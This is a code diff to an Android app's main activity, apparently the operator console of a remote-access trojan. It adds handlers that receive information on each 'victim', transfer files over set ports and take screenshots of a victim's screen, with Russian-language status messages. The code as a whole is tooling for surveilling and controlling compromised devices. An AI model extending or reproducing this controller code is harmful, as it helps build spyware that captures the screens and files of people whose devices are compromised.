@@ -219,24 +219,12 @@ public class MainActivity extends AppCompatActivity {
                     long size = message.getLong("size");
                     String lastModified = message.getString("lastModifiedTime");
                     FileManagerActivity.getInstance().initFileInfo(fullPath, size, lastModified);
-                    break;
-                case "getVictimInfo":
-                    if (message.has("code")) {
-                        switch (message.getString("code")) {
-                            case PROCESS:
-                                showText("Получаем информацию...");
-                                return;
-                        }
-                    }
-
-                    String name = message.getString("name");
-                    String phoneName = message.getString("phoneName");
-                    String owner = message.getString("owner");
-                    String ip = message.getString("ip");
-                    int serverPort = message.getInt("serverPort");
-                    int downloadPort = message.getInt("downloadPort");
-                    VictimsActivity.getInstance().initVictimInfo(name, phoneName, owner, ip, serverPort, downloadPort);
                     break;*/
+                case "get.victim.info":
+                    String victim = (String) message.get("victim");
+                    JSONObject info = (JSONObject) message.get("info");
+                    VictimsActivity.getInstance().initVictimInfo(victim, info);
+                    break;
                 case "start.upload.file":
                     UploadThread upload = new UploadThread((String) message.get("path"), ((Long) message.get("port")).intValue());
                     upload.start();
@@ -256,6 +244,20 @@ public class MainActivity extends AppCompatActivity {
                             return;
                         case ERROR:
                             showText("Ошибка загрузки файла!");
+                            return;
+                    }
+                    break;
+                case "take.screen":
+                    switch ((String) message.get("code")) {
+                        /*case PROCESS:
+                            showText("Создаем...");
+                            return;*/
+                        case SUCCESS:
+                            showText("Скрин экрана сохранен!");
+                            FileManagerActivity.getInstance().send_getFiles();
+                            return;
+                        case ERROR:
+                            showText("Не удалось сделать скрин!");
                             return;
                     }
                     break;
